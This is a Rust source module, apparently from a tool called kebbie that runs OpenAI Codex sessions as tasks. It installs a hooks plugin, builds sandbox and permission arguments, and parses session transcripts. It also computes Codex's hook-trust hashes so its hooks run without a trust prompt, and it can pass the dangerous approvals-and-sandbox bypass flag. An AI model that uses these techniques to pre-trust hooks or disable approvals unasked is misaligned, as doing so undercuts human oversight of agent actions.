use std::path::{Path, PathBuf};

use serde_json::{Value, json};
use sha2::{Digest, Sha256};

use super::Started;
use super::claude::Screens;
use crate::hooks::{Answer, Payload};
use crate::profiles::Profile;
use crate::sh::Result;
use crate::tasks::Session;
use crate::typing::Draft;

// Codex reinstalls an enabled plugin from any marketplace of the same name it finds in the session's repo, and kebbie's own repo ships a Claude marketplace named "kebbie".
pub const PLUGIN_ID: &str = "kebbie@kebbie-tasks";
const MARKETPLACE: &str = "kebbie-tasks";
const NAME: &str = "kebbie";
const OLD_MARKETPLACE: &str = "kebbie";
const OLD_ENABLE: &str = "plugins.kebbie@kebbie.enabled=true";
const MARKETPLACE_FILES: [&str; 4] = [".agents/plugins/marketplace.json", ".agents/plugins/api_marketplace.json", ".claude-plugin/marketplace.json", ".cursor-plugin/marketplace.json"];
const MANIFEST: &str = ".codex-plugin/plugin.json";
const HOOKS_FILE: &str = "hooks/hooks.json";
const LAUNCHER: &str = "bin/kebbie-hook";
const HOOK_TIMEOUT: u64 = 30;
const DEFAULT_CONTEXT_LIMIT: u64 = 2500;
pub const TASK_VAR: &str = "KEBBIE_ADDRESS";

struct Hook {
    event: &'static str,
    label: &'static str,
    arg: &'static str,
    context_limit: Option<u64>,
}

// The role arrives as SessionStart context, so its limit is 0: Codex would otherwise spill a long role to a file and show the model a preview.
const HOOKS: [Hook; 4] = [
    Hook { event: "SessionStart", label: "session_start", arg: "session-start", context_limit: Some(0) },
    Hook { event: "UserPromptSubmit", label: "user_prompt_submit", arg: "prompt", context_limit: None },
    Hook { event: "Stop", label: "stop", arg: "stop", context_limit: None },
    Hook { event: "PreToolUse", label: "pre_tool_use", arg: "pre-tool", context_limit: None },
];

pub fn home() -> Option<PathBuf> {
    std::env::var("CODEX_HOME").ok().filter(|dir| !dir.is_empty()).map(PathBuf::from).or_else(|| std::env::var("HOME").ok().map(|home| Path::new(&home).join(".codex")))
}

fn plugin_base(home: &Path, marketplace: &str) -> PathBuf {
    home.join("plugins/cache").join(marketplace).join(NAME)
}

// Codex loads an enabled plugin from its cache at <marketplace>/<plugin>/<version>, and "local" wins over any other version there.
pub fn plugin_root(home: &Path) -> PathBuf {
    plugin_base(home, MARKETPLACE).join("local")
}

// Versions beside "local" are copies Codex installed itself from a marketplace of the same name; installing one removes "local".
pub fn foreign_copies(home: &Path, marketplace: &str) -> Vec<PathBuf> {
    let mut found: Vec<PathBuf> = std::fs::read_dir(plugin_base(home, marketplace)).into_iter().flatten().flatten()
        .filter(|entry| entry.path().is_dir())
        .filter(|entry| entry.file_name().to_str().is_some_and(|name| name != "local" && !name.starts_with('.')))
        .map(|entry| entry.path())
        .collect();
    found.sort();
    found
}

// Copies under kebbie@kebbie, the id a repo's marketplace named "kebbie" replaces; nothing turns them on.
pub fn old_copies(home: &Path) -> Vec<PathBuf> {
    foreign_copies(home, OLD_MARKETPLACE)
}

fn old_local(home: &Path) -> PathBuf {
    plugin_base(home, OLD_MARKETPLACE).join("local")
}

fn ours(dir: &Path) -> bool {
    std::fs::read_to_string(dir.join(LAUNCHER)).is_ok_and(|text| text.contains("hook codex"))
}

fn remove_empty_above(dir: &Path, levels: usize) {
    for dir in dir.ancestors().skip(1).take(levels) {
        if std::fs::remove_dir(dir).is_err() {
            break;
        }
    }
}

// Only kebbie's own "local" under kebbie@kebbie goes; a copy Codex installed there is left for doctor to name.
fn remove_old(home: &Path) -> Result<bool> {
    let old = old_local(home);
    if !ours(&old) {
        return Ok(false);
    }
    std::fs::remove_dir_all(&old).map_err(|error| format!("{}: {error}", old.display()))?;
    remove_empty_above(&old, 2);
    Ok(true)
}

// A marketplace in the task's folder that offers a plugin under kebbie's id would make Codex replace kebbie's plugin with it.
pub fn shadowed_in(folder: &Path) -> Option<PathBuf> {
    MARKETPLACE_FILES.iter().map(|file| folder.join(file)).find(|path| {
        let Some(manifest) = std::fs::read_to_string(path).ok().and_then(|text| serde_json::from_str::<Value>(&text).ok()) else { return false };
        manifest["name"] == MARKETPLACE && manifest["plugins"].as_array().is_some_and(|plugins| plugins.iter().any(|plugin| plugin["name"] == NAME))
    })
}

fn handler(hook: &Hook) -> Value {
    let mut handler = json!({ "type": "command", "command": format!("\"${{PLUGIN_ROOT}}/{LAUNCHER}\" {}", hook.arg), "timeout": HOOK_TIMEOUT });
    if let Some(limit) = hook.context_limit {
        handler["additionalContextLimit"] = json!(limit);
    }
    handler
}

pub fn hooks_json() -> String {
    let hooks: serde_json::Map<String, Value> = HOOKS.iter().map(|hook| (hook.event.to_string(), json!([{ "hooks": [handler(hook)] }]))).collect();
    serde_json::to_string_pretty(&json!({ "description": "kebbie's hooks for the Codex sessions it runs as tasks", "hooks": hooks })).unwrap_or_default() + "\n"
}

// Codex names a plugin hook's trust entry <plugin id>:<file in the plugin>:<event>:<group>:<handler>.
fn hook_key(hook: &Hook) -> String {
    format!("{PLUGIN_ID}:{HOOKS_FILE}:{}:0:0", hook.label)
}

// Codex 0.163's hook_hash: the event's label and the group with its one normalized handler, as JSON with sorted keys, under SHA-256.
fn hook_hash(hook: &Hook) -> String {
    let mut normalized = json!({ "type": "command", "command": handler(hook)["command"], "timeout": HOOK_TIMEOUT, "async": false });
    if let Some(limit) = hook.context_limit.filter(|limit| *limit != DEFAULT_CONTEXT_LIMIT) {
        normalized["additionalContextLimit"] = json!(limit);
    }
    sha256_version(&json!({ "event_name": hook.label, "hooks": [normalized] }))
}

fn sha256_version(value: &Value) -> String {
    sha256_text(&Sha256::digest(serde_json::to_vec(value).unwrap_or_default()))
}

fn sha256_text(digest: &[u8]) -> String {
    format!("sha256:{}", digest.iter().map(|byte| format!("{byte:02x}")).collect::<String>())
}

// Codex 0.166's plugin_content_hash (hooks/src/engine/plugin_fingerprint.rs): each entry under the root, depth first in byte order, as its relative path, its kind, and a file's length and bytes.
fn content_hash(root: &Path) -> std::io::Result<String> {
    if !std::fs::symlink_metadata(root)?.is_dir() {
        return Err(std::io::Error::other("plugin root is not a directory"));
    }
    let mut hash = Sha256::new();
    hash.update(b"codex-plugin-bundle-v1");
    let mut pending = vec![root.to_path_buf()];
    while let Some(path) = pending.pop() {
        let relative = path.strip_prefix(root).map_err(std::io::Error::other)?;
        if relative.file_name().and_then(|name| name.to_str()).is_some_and(|name| matches!(name, "__pycache__" | ".venv") || name.ends_with(".pyc") || name.ends_with(".egg-info")) {
            continue;
        }
        let name = relative.as_os_str().as_encoded_bytes();
        hash.update((name.len() as u64).to_le_bytes());
        hash.update(name);
        let metadata = std::fs::symlink_metadata(&path)?;
        if metadata.is_dir() {
            hash.update(b"directory");
            let mut entries = std::fs::read_dir(&path)?.collect::<std::io::Result<Vec<_>>>()?;
            entries.sort_by_key(std::fs::DirEntry::file_name);
            pending.extend(entries.iter().rev().map(std::fs::DirEntry::path));
        } else if metadata.is_file() {
            let bytes = std::fs::read(&path)?;
            hash.update(b"file");
            hash.update((bytes.len() as u64).to_le_bytes());
            hash.update(&bytes);
        } else {
            return Err(std::io::Error::other(format!("unsupported plugin entry type: {}", path.display())));
        }
    }
    Ok(sha256_text(&hash.finalize()))
}

fn toml_string(text: &str) -> String {
    let mut quoted = String::from("\"");
    for character in text.chars() {
        match character {
            '"' => quoted.push_str("\\\""),
            '\\' => quoted.push_str("\\\\"),
            '\n' => quoted.push_str("\\n"),
            '\t' => quoted.push_str("\\t"),
            '\r' => quoted.push_str("\\r"),
            character if character.is_control() => quoted.push_str(&format!("\\u{:04X}", character as u32)),
            character => quoted.push(character),
        }
    }
    quoted.push('"');
    quoted
}

pub fn hook_count() -> usize {
    HOOKS.len()
}

// A -c key is split on every dot, so the trust entries, whose keys hold "hooks.json", go in as one inline table.
fn trust_entries(content: Option<&str>) -> String {
    let content = content.map(|hash| format!(",trusted_content_hash={}", toml_string(hash))).unwrap_or_default();
    let entries: Vec<String> = HOOKS.iter().map(|hook| format!("{}={{trusted_hash={}{content}}}", toml_string(&hook_key(hook)), toml_string(&hook_hash(hook)))).collect();
    format!("hooks.state={{{}}}", entries.join(","))
}

// Codex 0.166 without trusted_content_hash checks the plugin against the baseline it pinned in .hook-trust on first sight, which any later change to the plugin leaves stale (hooks/src/engine/plugin_trust.rs, matches_hash).
pub fn trust_override() -> String {
    trust_entries(home().and_then(|home| content_hash(&plugin_root(&home)).ok()).as_deref())
}

pub fn enable_override() -> String {
    format!("plugins.{PLUGIN_ID}.enabled=true")
}

fn launcher(kebbie: &str) -> String {
    format!("#!/bin/sh\nkebbie={}\n[ -x \"$kebbie\" ] || exit 0\nexec \"$kebbie\" hook codex \"$@\"\n", crate::sh::quote(kebbie))
}

// Codex 0.164 asks again to trust a plugin's hooks whenever a byte of the plugin changes, so nothing here may follow kebbie's version.
fn manifest() -> String {
    serde_json::to_string_pretty(&json!({ "name": NAME, "description": "kebbie's hooks for the Codex sessions it runs as tasks: it records the session, gives it its role, and asks for a report before a turn ends" })).unwrap_or_default() + "\n"
}

fn plugin_files(kebbie: &str) -> [(&'static str, String, bool); 3] {
    [(MANIFEST, manifest(), false), (HOOKS_FILE, hooks_json(), false), (LAUNCHER, launcher(kebbie), true)]
}

#[derive(Clone, Debug, PartialEq)]
pub enum Installed {
    Missing,
    Current,
    Stale(Vec<&'static str>),
    Replaced(Vec<PathBuf>),
    UnderOldId(PathBuf),
}

// Whether kebbie's plugin is there at all, with no kebbie command to compare its files against.
pub fn plugin_state(home: &Path) -> Installed {
    installed(home, "")
}

pub fn installed(home: &Path, kebbie: &str) -> Installed {
    let root = plugin_root(home);
    if !root.join(HOOKS_FILE).is_file() {
        let copies = foreign_copies(home, MARKETPLACE);
        if !copies.is_empty() {
            return Installed::Replaced(copies);
        }
        return if ours(&old_local(home)) { Installed::UnderOldId(old_local(home)) } else { Installed::Missing };
    }
    let stale: Vec<&'static str> = plugin_files(kebbie).into_iter().filter(|(file, text, _)| std::fs::read_to_string(root.join(file)).ok().as_deref() != Some(text.as_str())).map(|(file, _, _)| file).collect();
    if stale.is_empty() { Installed::Current } else { Installed::Stale(stale) }
}

fn write_file(path: &Path, text: &str, executable: bool) -> Result<()> {
    use std::os::unix::fs::PermissionsExt;
    let dir = path.parent().ok_or_else(|| format!("{} has no folder", path.display()))?;
    std::fs::create_dir_all(dir).map_err(|error| format!("{}: {error}", dir.display()))?;
    let temp = dir.join(format!(".{}.{}.tmp", path.file_name().unwrap_or_default().to_string_lossy(), std::process::id()));
    std::fs::write(&temp, text).map_err(|error| format!("{}: {error}", temp.display()))?;
    std::fs::set_permissions(&temp, std::fs::Permissions::from_mode(if executable { 0o755 } else { 0o644 })).map_err(|error| format!("{}: {error}", temp.display()))?;
    std::fs::rename(&temp, path).map_err(|error| format!("{}: {error}", path.display()))
}

// Trust covers the hooks' command line, never the launcher it runs, so a task starts only on the plugin exactly as this kebbie writes it.
pub fn ready_to_start(home: Option<&Path>, kebbie: &str) -> Result<()> {
    let home = home.ok_or("Neither CODEX_HOME nor HOME is set, so kebbie cannot find Codex's home")?;
    match installed(home, kebbie) {
        Installed::Current => Ok(()),
        Installed::Missing => Err(super::Agent::Codex.not_set_up()),
        Installed::Stale(files) => Err(format!("kebbie's Codex plugin in {} is not what this kebbie writes ({}); run kebbie setup codex", plugin_root(home).display(), files.join(", "))),
        Installed::Replaced(copies) => Err(format!("Codex replaced kebbie's plugin with {}, a copy from a marketplace of the same name; run kebbie setup codex", shown_paths(&copies))),
        Installed::UnderOldId(old) => Err(format!("kebbie's Codex plugin is at {}, under the id kebbie@kebbie, which a repo's marketplace replaces; run kebbie setup codex", old.display())),
    }
}

pub fn shown_paths(paths: &[PathBuf]) -> String {
    paths.iter().map(|path| path.display().to_string()).collect::<Vec<_>>().join(", ")
}

// Only kebbie's own folder in Codex's plugin cache is written; Codex's config.toml and hooks.json stay the user's.
pub fn install(home: &Path, kebbie: &str) -> Result<Vec<&'static str>> {
    let root = plugin_root(home);
    let mut written = Vec::new();
    for (file, text, executable) in plugin_files(kebbie) {
        let path = root.join(file);
        if std::fs::read_to_string(&path).ok().as_deref() != Some(text.as_str()) {
            write_file(&path, &text, executable)?;
            written.push(file);
        }
    }
    remove_old(home)?;
    Ok(written)
}

// An update brings an opted-in plugin along and never installs one: None when there is none to refresh.
pub fn refresh(home: Option<&Path>, kebbie: &str) -> Option<Result<Vec<&'static str>>> {
    let home = home?;
    match installed(home, kebbie) {
        Installed::Missing => None,
        Installed::Current => Some(Ok(Vec::new())),
        Installed::Stale(_) | Installed::Replaced(_) | Installed::UnderOldId(_) => Some(install(home, kebbie)),
    }
}

pub fn refresh_line(home: Option<&Path>, kebbie: &str) -> Option<String> {
    refresh(home, kebbie).map(|refreshed| match refreshed {
        Ok(files) if files.is_empty() => "Codex plugin: up to date".to_string(),
        Ok(files) => format!("Codex plugin: updated {}", files.join(", ")),
        Err(error) => format!("Codex plugin: {error}"),
    })
}

pub fn uninstall(home: &Path) -> Result<bool> {
    let root = plugin_root(home);
    let old = remove_old(home)?;
    if !root.exists() {
        return Ok(old);
    }
    std::fs::remove_dir_all(&root).map_err(|error| format!("{}: {error}", root.display()))?;
    remove_empty_above(&root, 2);
    Ok(true)
}

// Codex's update screen stands before its composer, so the sessions kebbie starts never check; config.toml stays the user's.
const NO_UPDATE_CHECK: &str = "check_for_update_on_startup=false";

// kebbie reads a waiting view and the thread title from Codex's default title items (tui/src/chatwidget/status_surfaces.rs), so the sessions it starts show those whatever the user's tui.terminal_title names.
const TITLE_ITEMS: &str = "tui.terminal_title=[\"activity\",\"thread-name\",\"project-name\"]";

// kebbie's plugin runs only in the sessions kebbie starts: enabled, and its hooks and files trusted by hash, for that invocation alone.
pub fn plugin_args() -> [String; 8] {
    ["-c".to_string(), enable_override(), "-c".to_string(), trust_override(), "-c".to_string(), NO_UPDATE_CHECK.to_string(), "-c".to_string(), TITLE_ITEMS.to_string()]
}

// --sandbox or --approve-for-me selects Codex's legacy workspace-write over kebbie's permission profile (core/src/config/mod.rs, resolve_permission_config_syntax).
fn access(mode: Option<&str>, sandboxed: bool) -> Vec<String> {
    let words: &[&str] = match (mode, sandboxed) {
        (Some("plan"), _) => &["--sandbox", "read-only", "--ask-for-approval", "on-request"],
        (Some("auto"), _) => &["--ask-for-approval", "on-request", "-c", "approvals_reviewer=\"auto_review\""],
        (Some("bypassPermissions" | "dontAsk"), true) => &["--ask-for-approval", "never"],
        (_, true) => &["--ask-for-approval", "on-request"],
        (Some("bypassPermissions"), false) => &["--dangerously-bypass-approvals-and-sandbox"],
        (Some("dontAsk"), false) => &["--ask-for-approval", "never"],
        (_, false) => &[],
    };
    words.iter().map(|word| word.to_string()).collect()
}

const PERMISSIONS: &str = "kebbie-task";

fn commit_roots(git_dir: Option<&Path>) -> Vec<PathBuf> {
    let Some(dirs) = git_dir.map(|git_dir| crate::sandbox::TaskDirs::new(Path::new(""), git_dir, Path::new(""))) else { return Vec::new() };
    let common = dirs.common_dir();
    let mut roots: Vec<PathBuf> = ["objects", "refs", "logs"].iter().map(|dir| common.join(dir)).collect();
    if dirs.git_dir() != common {
        roots.push(dirs.git_dir());
    }
    roots
}

fn git_run_as_user(git_dir: Option<&Path>) -> Vec<PathBuf> {
    let Some(dirs) = git_dir.map(|git_dir| crate::sandbox::TaskDirs::new(Path::new(""), git_dir, Path::new(""))) else { return Vec::new() };
    let (own, common) = (dirs.git_dir(), dirs.common_dir());
    let mut paths: Vec<PathBuf> = ["config", "config.worktree", "hooks", "modules"].iter().map(|name| common.join(name)).collect();
    if own != common {
        paths.extend(["config.worktree", "commondir", "gitdir"].iter().map(|name| own.join(name)));
    }
    paths.push(own.join("kebbie-hooks"));
    paths
}

// Codex keeps a worktree's git dir read-only unless it is itself a writable root, and a -c list replaces the user's own roots.
fn unsandboxed_args(policy: &crate::sandbox::Policy, git_dir: Option<&Path>, user_roots: &[String]) -> Vec<String> {
    let caches = policy.writes().into_iter().filter_map(|path| crate::config::skill_path(&path)).map(|path| path.to_string_lossy().to_string());
    let roots: Vec<String> = user_roots.iter().cloned().chain(caches).chain(commit_roots(git_dir).iter().map(|root| root.to_string_lossy().to_string())).map(|root| toml_string(&root)).collect();
    let mut args = Vec::new();
    if !roots.is_empty() {
        args.extend(["-c".to_string(), format!("sandbox_workspace_write.writable_roots=[{}]", roots.join(","))]);
    }
    args.extend(["-c".to_string(), "sandbox_workspace_write.network_access=true".to_string()]);
    args
}

// The domains hold only through Codex's experimental network proxy: without features.network_proxy every host is reachable.
fn permission_profile(policy: &crate::sandbox::Policy, git_dir: Option<&Path>, mac: bool) -> String {
    let access = |path: String, mode: &str| format!("{}={}", toml_string(&path), toml_string(mode));
    let mut entries = vec![access(":root".to_string(), "read"), access(":tmpdir".to_string(), "write"), access(":slash_tmp".to_string(), "write"), format!("{}={{\".\"=\"write\"}}", toml_string(":workspace_roots"))];
    entries.extend(policy.writes().into_iter().filter(|path| path.starts_with('/') || path.starts_with("~/")).map(|path| access(path, "write")));
    entries.extend(commit_roots(git_dir).iter().map(|root| access(root.to_string_lossy().to_string(), "write")));
    entries.extend(git_run_as_user(git_dir).iter().map(|path| access(path.to_string_lossy().to_string(), "read")));
    entries.extend(crate::sandbox::Protected::here().secrets().into_iter().chain(policy.kubeconfig_file().map(|file| file.to_string_lossy().to_string())).map(|path| access(path, "deny")));
    let domains: Vec<String> = policy.domains().iter().map(|domain| access(domain.clone(), "allow")).collect();
    let network = if domains.is_empty() { "{enabled=false}".to_string() } else { format!("{{enabled=true,allow_local_binding={mac},domains={{{}}}}}", domains.join(",")) };
    format!("permissions.{PERMISSIONS}={{filesystem={{{}}},network={network}}}", entries.join(","))
}

fn sandbox_args(mode: Option<&str>, profile: &Profile, sandboxed: bool, git_dir: Option<&Path>, user_roots: &[String]) -> Vec<String> {
    match (mode, sandboxed) {
        (Some("plan"), _) | (Some("bypassPermissions"), false) => Vec::new(),
        (_, false) => unsandboxed_args(&profile.sandbox, git_dir, user_roots),
        (_, true) => ["-c".to_string(), format!("default_permissions={}", toml_string(PERMISSIONS)), "-c".to_string(), permission_profile(&profile.sandbox, git_dir, cfg!(target_os = "macos")), "-c".to_string(), "features.network_proxy=true".to_string()].to_vec(),
    }
}

pub fn writable_roots_in(config: &toml::Table) -> Vec<String> {
    let roots = config.get("sandbox_workspace_write").and_then(|table| table.get("writable_roots")).and_then(toml::Value::as_array);
    roots.into_iter().flatten().filter_map(toml::Value::as_str).map(str::to_string).collect()
}

// The commands Codex runs get the push block and the task's address, which also names the task to kebbie's caller check.
fn env_override(address: &str, tmp: Option<&Path>, policy: &crate::sandbox::Policy) -> String {
    let mut set = crate::push_block::env_vars(policy.runs_ssh());
    set.push((TASK_VAR.to_string(), address.to_string()));
    set.extend(policy.kubeconfig_file().map(|kubeconfig| (crate::sandbox::KUBECONFIG.to_string(), kubeconfig.to_string_lossy().to_string())));
    if let Some(tmp) = tmp {
        set.push(("TMPDIR".to_string(), tmp.to_string_lossy().to_string()));
    }
    format!("shell_environment_policy.set={{{}}}", set.iter().map(|(name, value)| format!("{name}={}", toml_string(value))).collect::<Vec<_>>().join(","))
}

// Codex picks a new session's id itself, so a new start names none and the SessionStart hook records it; a resume is the resume subcommand with the id last.
pub(crate) fn start_args(mode: Option<&str>, profile: &Profile, files: &super::TaskFiles, session: &Session) -> Vec<String> {
    let mut args = Vec::new();
    if let Session::Resume(_) = session {
        args.push("resume".to_string());
    }
    args.extend(access(mode, files.sandboxed));
    args.extend(sandbox_args(mode, profile, files.sandboxed, files.git_dir, files.codex_roots));
    if let Some(model) = &profile.model {
        args.extend(["--model".to_string(), model.clone()]);
    }
    if let Some(effort) = &profile.effort {
        args.extend(["-c".to_string(), format!("model_reasoning_effort={}", toml_string(effort))]);
    }
    args.extend(["-c".to_string(), env_override(files.address, files.tmp, &profile.sandbox)]);
    args.extend(files.hidden.iter().cloned());
    args.extend(plugin_args());
    if let Session::Resume(id) = session {
        args.push(id.clone());
    }
    args
}

// Codex's read-only sandbox is the reviewer's boundary: no write and no network for its commands, none of the user's config, rules, MCP servers or plugins, and no session file beside the task's.
pub(crate) fn reviewer_args(reviewer: &super::Reviewer) -> Vec<String> {
    let mut args: Vec<String> = ["exec", "--sandbox", "read-only", "--ignore-user-config", "--ignore-rules", "--ephemeral", "--color", "never", "-c", NO_UPDATE_CHECK].map(str::to_string).to_vec();
    args.extend(["-c".to_string(), format!("shell_environment_policy.set={{{}}}", crate::review::READER_ENV.iter().map(|(name, value)| format!("{name}={}", toml_string(value))).collect::<Vec<_>>().join(","))]);
    args.extend(["--output-last-message".to_string(), reviewer.answer.to_string_lossy().to_string()]);
    if let Some(model) = reviewer.model {
        args.extend(["--model".to_string(), model.to_string()]);
    }
    if let Some(effort) = reviewer.effort {
        args.extend(["-c".to_string(), format!("model_reasoning_effort={}", toml_string(effort))]);
    }
    args.push("-".to_string());
    args
}

const SWITCHES: [&str; 8] = ["--approve-for-me", "--dangerously-bypass-approvals-and-sandbox", "--dangerously-bypass-hook-trust", "--search", "--no-alt-screen", "--oss", "--strict-config", "--no-daemon"];
const VALUES: [&str; 18] = ["-c", "--config", "-m", "--model", "-s", "--sandbox", "-a", "--ask-for-approval", "-p", "--profile", "--enable", "--disable", "-C", "--cd", "--add-dir", "--local-provider", "--remote", "--remote-auth-token-env"];
const REFUSED: [&str; 6] = ["-h", "--help", "-V", "--version", "-i", "--image"];
const DROPPED: [&str; 3] = ["--last", "--all", "--include-non-interactive"];

pub(crate) const ARGS: super::ArgSpec = super::ArgSpec {
    program: "codex",
    runtimes: &["node"],
    script: |script| script.contains("codex"),
    switches: &SWITCHES,
    values: &VALUES,
    optionals: &[],
    many: &[],
    dropped_switches: &DROPPED,
    dropped_values: &[],
    dropped_optionals: &[],
    refused: &REFUSED,
    before: &["resume"],
    after: &[],
};

fn has_config(args: &[String], value: &str) -> bool {
    args.windows(2).any(|pair| (pair[0] == "-c" || pair[0] == "--config") && pair[1] == value)
}

// A task's Codex without kebbie's plugin enabled and trusted runs none of its hooks, so it never reports.
pub fn lacks_role(argv: &[String]) -> bool {
    !has_config(argv, &enable_override()) || !has_config(argv, &trust_override())
}

pub fn with_role(args: &[String]) -> Vec<String> {
    let mut kept = Vec::new();
    let mut words = args.iter().peekable();
    while let Some(word) = words.next() {
        let ours = |value: &String| value == &enable_override() || value == OLD_ENABLE || value == NO_UPDATE_CHECK || value.starts_with("hooks.state=") || value.starts_with("tui.terminal_title=");
        if (word == "-c" || word == "--config") && words.peek().is_some_and(|value| ours(value)) {
            words.next();
        } else {
            kept.push(word.clone());
        }
    }
    let at = if kept.first().is_some_and(|word| word == "resume") { kept.len().saturating_sub(1).max(1) } else { kept.len() };
    kept.splice(at..at, plugin_args());
    kept
}

fn rollouts(home: &Path) -> Vec<PathBuf> {
    let mut found = Vec::new();
    let mut dirs = vec![home.join("sessions")];
    while let Some(dir) = dirs.pop() {
        for entry in std::fs::read_dir(&dir).into_iter().flatten().flatten() {
            let path = entry.path();
            if path.is_dir() {
                dirs.push(path);
            } else if path.file_name().and_then(|name| name.to_str()).is_some_and(|name| name.starts_with("rollout-") && (name.ends_with(".jsonl") || name.ends_with(COMPRESSED))) {
                found.push(path);
            }
        }
    }
    found
}

const COMPRESSED: &str = ".jsonl.zst";

// Codex 0.163 writes a session to sessions/YYYY/MM/DD/rollout-<local time>-<session id>.jsonl under its home, and may compress one idle for a week to .jsonl.zst, which it still resumes.
pub fn transcript(home: &Path, session: &str) -> Option<PathBuf> {
    let found = rollouts(home);
    let named = |suffix: String| found.iter().find(|path| path.file_name().and_then(|name| name.to_str()).is_some_and(|name| name.ends_with(&suffix))).cloned();
    named(format!("-{session}.jsonl")).or_else(|| named(format!("-{session}{COMPRESSED}")))
}

// kebbie reads no compressed rollout, so what such a session heard is unknown rather than nothing.
pub fn compressed(path: &Path) -> bool {
    path.to_string_lossy().ends_with(COMPRESSED)
}

fn meta(path: &Path) -> Option<Value> {
    use std::io::BufRead;
    let file = std::fs::File::open(path).ok()?;
    let first = std::io::BufReader::new(file).lines().next()?.ok()?;
    let line: Value = serde_json::from_str(&first).ok()?;
    (line["type"] == "session_meta").then(|| line["payload"].clone())
}

// The newest conversation Codex began in this folder since the given time, by the session_meta line each rollout opens with.
pub fn latest_session(home: &Path, folder: &Path, since: std::time::SystemTime) -> Option<String> {
    rollouts(home).into_iter()
        .filter_map(|path| Some((std::fs::metadata(&path).ok()?.modified().ok()?, path)))
        .filter(|(modified, _)| *modified >= since)
        .filter_map(|(modified, path)| {
            let meta = meta(&path)?;
            let cwd = meta["cwd"].as_str().map(PathBuf::from)?;
            (cwd == folder).then(|| Some((modified, meta["id"].as_str()?.to_string()))).flatten()
        })
        .max_by_key(|(modified, _)| *modified)
        .map(|(_, id)| id)
}

// One user turn in a rollout: event_msg user_message in Codex's legacy history, item_completed with a UserMessage item in its paginated one.
pub(crate) fn user_text(line: &Value) -> Option<String> {
    if line["type"] != "event_msg" {
        return None;
    }
    let payload = &line["payload"];
    match payload["type"].as_str()? {
        "user_message" => payload["message"].as_str().map(str::to_string),
        "item_completed" if payload["item"]["type"] == "UserMessage" => {
            let parts: Vec<&str> = payload["item"]["content"].as_array()?.iter().filter(|part| part["type"] == "text").filter_map(|part| part["text"].as_str()).collect();
            (!parts.is_empty()).then(|| parts.join("\n"))
        }
        _ => None,
    }
}

pub fn user_messages_at(transcript: &str) -> Vec<(Option<u64>, String)> {
    transcript.lines().filter_map(|line| serde_json::from_str::<Value>(line).ok())
        .filter_map(|line| Some((line["timestamp"].as_str().and_then(crate::typing::iso_millis), user_text(&line)?.trim().to_string())))
        .filter(|(_, text)| !text.is_empty() && !text.starts_with('<'))
        .collect()
}

// What Codex 0.163 draws in an empty composer (tui/src/chatwidget.rs); other faint text there is none kebbie can place, so it never counts as empty.
const PLACEHOLDERS: [&str; 2] = ["Ask Codex to do anything", "Ask a follow-up question"];

pub fn draft(screen: &str) -> Draft {
    let styled: Vec<crate::typing::Styled> = screen.lines().map(crate::typing::styled).collect();
    let Some(prompt) = styled.iter().rposition(|line| line.text.trim_start().starts_with('›')) else { return Draft::Unreadable };
    let end = (prompt + 1..styled.len()).find(|&at| styled[at].text.trim().is_empty()).unwrap_or(styled.len());
    let lines = &styled[prompt..end];
    let first = lines[0].text.trim_start().trim_start_matches('›').trim().to_string();
    let text: Vec<String> = std::iter::once(first).chain(lines[1..].iter().map(|line| line.text.trim().to_string())).filter(|line| !line.is_empty()).collect();
    let joined = text.join("\n");
    if text.is_empty() || PLACEHOLDERS.contains(&joined.as_str()) {
        return Draft::Empty;
    }
    if crate::typing::suggested(lines, &['›']) {
        return Draft::Unreadable;
    }
    Draft::Typed(joined)
}

// Codex 0.163 never writes its Error event to the rollout, but a turn that failed carries it on its task_complete event (core/src/tasks/mod.rs, rollout/src/policy.rs).
pub fn observe(rollout: &str) -> crate::recover::Tail {
    let mut tail = crate::recover::Tail::default();
    let mut failed: Option<Value> = None;
    for line in rollout.lines().filter_map(|line| serde_json::from_str::<Value>(line).ok()) {
        if user_text(&line).is_some() {
            tail.prompted = true;
        } else if line["type"] == "event_msg" && line["payload"]["type"] == "task_complete" {
            if line["payload"]["error"].is_object() {
                failed = Some(line);
                tail.prompted = false;
                tail.replied = false;
            } else {
                failed = None;
                tail.replied = true;
            }
        }
    }
    tail.failure = failed.filter(|_| !tail.prompted).and_then(|line| {
        let error = &line["payload"]["error"];
        let message = error["message"].as_str().unwrap_or_default();
        Some(crate::recover::Failure {
            id: line["payload"]["turn_id"].as_str().unwrap_or_default().to_string(),
            at: line["timestamp"].as_str().and_then(crate::typing::iso_millis)? / 1000,
            error: crate::recover::ApiError::Fatal { kind: error_kind(&error["codex_error_info"], message), text: short_error(message) },
        })
    });
    tail
}

// The info is a word or a one-key table, as {"http_connection_failed":{"http_status_code":400}}; the API's own code in the message says more.
fn error_kind(info: &Value, message: &str) -> &'static str {
    if let Some(kind) = crate::recover::fatal_code_in(message) {
        return kind;
    }
    let (word, status) = match info {
        Value::String(word) => (word.as_str(), None),
        Value::Object(table) => table.iter().next().map_or(("", None), |(word, fields)| (word.as_str(), fields["http_status_code"].as_u64())),
        _ => ("", None),
    };
    match (word, status) {
        ("usage_limit_exceeded", _) => "the usage limit",
        ("rate_limit_exceeded", _) => "a rate limit",
        ("unauthorized", _) | (_, Some(401 | 403)) => "a login problem",
        ("context_window_exceeded", _) => "a full context window",
        ("bad_request" | "invalid_prompt", _) | (_, Some(400..=499)) => "an invalid request",
        ("server_overloaded", _) => "overload",
        ("internal_server_error", _) | (_, Some(500..)) => "a server error",
        ("http_connection_failed" | "response_stream_connection_failed" | "response_stream_disconnected", _) => "a dropped connection",
        _ => "an error Codex reported",
    }
}

// Codex's message for a status it did not expect carries the API's JSON body, whose own message is the readable part.
fn short_error(message: &str) -> String {
    let readable = message.find('{').and_then(|at| serde_json::Deserializer::from_str(&message[at..]).into_iter::<Value>().next()?.ok())
        .and_then(|body| [&body["error"]["message"], &body["message"], &body["detail"]].into_iter().find_map(|text| text.as_str().map(str::to_string)));
    let text = readable.unwrap_or_else(|| message.split(", url: ").next().unwrap_or(message).to_string());
    let text = text.split_whitespace().collect::<Vec<_>>().join(" ");
    if text.chars().count() > 200 { format!("{}…", text.chars().take(200).collect::<String>()) } else { text }
}

// The model Codex runs when kebbie passes no --model: its config.toml's own, read, never written.
pub fn configured_model(home: &Path) -> Option<String> {
    let config: toml::Table = std::fs::read_to_string(home.join("config.toml")).ok()?.parse().ok()?;
    model_in(&config)
}

pub fn model_in(config: &toml::Table) -> Option<String> {
    config.get("model").and_then(toml::Value::as_str).filter(|model| !model.trim().is_empty()).map(str::to_string)
}

#[derive(Clone, Debug, PartialEq)]
pub struct CachedModel {
    pub slug: String,
    pub name: String,
    pub listed: bool,
    pub default_effort: Option<String>,
